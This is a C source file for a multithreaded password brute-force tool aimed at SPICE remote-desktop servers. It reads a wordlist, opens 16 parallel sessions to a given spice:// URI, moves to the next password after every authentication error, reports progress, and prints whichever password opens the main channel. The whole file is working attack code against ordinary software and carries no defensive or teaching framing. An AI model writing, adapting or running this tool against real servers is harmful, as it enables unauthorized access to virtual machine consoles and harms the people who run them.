#include <assert.h>
#include <errno.h>
#include <glib.h>
#include <spice-client.h>
#include <spice/vd_agent.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "check.h"
#include "lock-file.h"
#include "spice-channel-types.h"
#include "utils.h"

#define THREADS_COUNT 16

GMainLoop *loop;
typedef struct {
    const char *uri;
    lock_file_t *password_file;
    char *buffer;
    size_t buflen;
    size_t index;
} thread_args_t;

typedef struct {
    lock_file_t *password_file;
    size_t total_password_count;
} print_status_args_t;

void channel_new_cb(SpiceSession *session, SpiceChannel *channel, gpointer user_data);
void channel_destroy_cb(SpiceSession *session, SpiceChannel *channel, gpointer user_data);
void channel_event_cb(SpiceChannel *channel, SpiceChannelEvent event, gpointer user_data);
void disconnected_cb(SpiceSession *session, gpointer user_data);
void try_next_password(SpiceSession *session, thread_args_t *args);
size_t count_passwords_in_file(lock_file_t *f);
int print_status_cb(gpointer user_data);
void g_thread_func(gpointer data, gpointer user_data);

int main(int argc, char *const argv[]) {
    if (argc != 3) {
        printf("usage: %s URI PASSWORD_FILE\n", program_invocation_short_name);
        printf("  URI: spice://HOST?port=PORT\n");
        return EXIT_FAILURE;
    }

    GThreadPool *tp = NULL;
    lock_file_t *password_file = NULL;
    const char *uri = argv[1];

    CHK_NULL(password_file = lock_file_open(argv[2], "r"));
    size_t total_password_count = count_passwords_in_file(password_file);
    printf("%lu passwords to try.", total_password_count);

    CHK_NULL(loop = g_main_loop_new(NULL, FALSE));
    CHK_NULL(tp = g_thread_pool_new(g_thread_func, NULL, THREADS_COUNT, FALSE, NULL));

    print_status_args_t ps_args = {.password_file = password_file,
                                   .total_password_count = total_password_count};
    g_timeout_add_seconds(5, print_status_cb, (void *)&ps_args);

    thread_args_t *t_args = NULL;
    CHK_NULL(t_args = calloc(THREADS_COUNT, sizeof(thread_args_t)));
    for (size_t i = 0; i < THREADS_COUNT; i++) {
        t_args[i].password_file = password_file;
        t_args[i].uri = uri;
        t_args[i].index = i;
        g_thread_pool_push(tp, (void *)&t_args[i], NULL);
    }
    g_main_loop_run(loop);
    g_main_loop_unref(loop);

    lock_file_close(password_file);

    return EXIT_SUCCESS;
}

void g_thread_func(gpointer data, gpointer user_data) {
    (void)user_data;
    thread_args_t *args = (thread_args_t *)data;
    SpiceSession *session = NULL;

    CHK_NULL(session = spice_session_new());
    g_signal_connect(G_OBJECT(session), "channel-new", G_CALLBACK(channel_new_cb), data);

    g_object_set(session, "uri", args->uri, NULL);
    CHK_FALSE(spice_session_connect(session));
    printf("Thread %lu launched\n", args->index);
}

void channel_new_cb(SpiceSession *_session, SpiceChannel *channel, gpointer data) {
    (void)_session;
    gint channel_type = -1;

    // printf("New channel created: %s\n", channel_to_string(channel));

    g_object_get(channel, "channel-type", &channel_type, NULL);

    switch (channel_type) {
    case SPICE_CHANNEL_MAIN:
        g_signal_connect(channel, "channel-event", G_CALLBACK(channel_event_cb), data);
        break;
    case SPICE_CHANNEL_INPUTS:
    case SPICE_CHANNEL_PLAYBACK:
    case SPICE_CHANNEL_CURSOR:
    case SPICE_CHANNEL_DISPLAY:
    case SPICE_CHANNEL_USBREDIR:
    case SPICE_CHANNEL_RECORD:
        break;
    default:
        break;
    }
}

void channel_event_cb(SpiceChannel *channel, SpiceChannelEvent event, gpointer data) {
    thread_args_t *args = (thread_args_t *)data;
    SpiceSession *session = NULL;

    g_object_get(channel, "spice-session", &session, NULL);

    switch (event) {
    case SPICE_CHANNEL_ERROR_AUTH:
        try_next_password(session, args);
        break;
    case SPICE_CHANNEL_OPENED: {
        const char *password = NULL;
        g_object_get(session, "password", &password, NULL);
        printf("Password: %s\n", password);
        spice_session_disconnect(session);
        g_main_loop_quit(loop);
        break;
    }
    default:
        printf("%s: event %s\n", channel_to_string(channel), channel_event_to_string(event));
        spice_session_disconnect(session);
        g_main_loop_quit(loop);
        break;
    }
}

int print_status_cb(gpointer user_data) {
    print_status_args_t *args = (print_status_args_t *)user_data;
    size_t passwords_checked_count = lock_file_get_count(args->password_file);
    double percent = 100.0 * (double)passwords_checked_count / (double)args->total_password_count;

    printf("Status: %lu/%lu %5.2f%%\n", passwords_checked_count, args->total_password_count,
           percent);
    return TRUE;
}

void try_next_password(SpiceSession *session, thread_args_t *args) {
    ssize_t n = lock_file_readline(args->password_file, &args->buffer, &args->buflen);
    if (n < 0) {
        printf("Reached EOF\n");
        g_main_loop_quit(loop);
        return;
    }
    assert(n > 0 && "Buffer should not be empty");
    // Remove trailing '\n'
    args->buffer[n - 1] = 0;

    g_object_set(session, "password", args->buffer, NULL);
    spice_session_connect(session);
}

size_t count_passwords_in_file(lock_file_t *lf) {
    // LOL: ugly
    FILE *f = ((FILE **)lf)[0];

    CHK_NEG(fseek(f, 0, SEEK_SET));
    size_t password_count = 0;
    char c;

    while (!feof(f)) {
        if (fscanf(f, "%c%*[^\n]\n", &c) == 1) {
            password_count++;
        }
    }

    CHK_NEG(fseek(f, 0, SEEK_SET));
    return password_count;
}
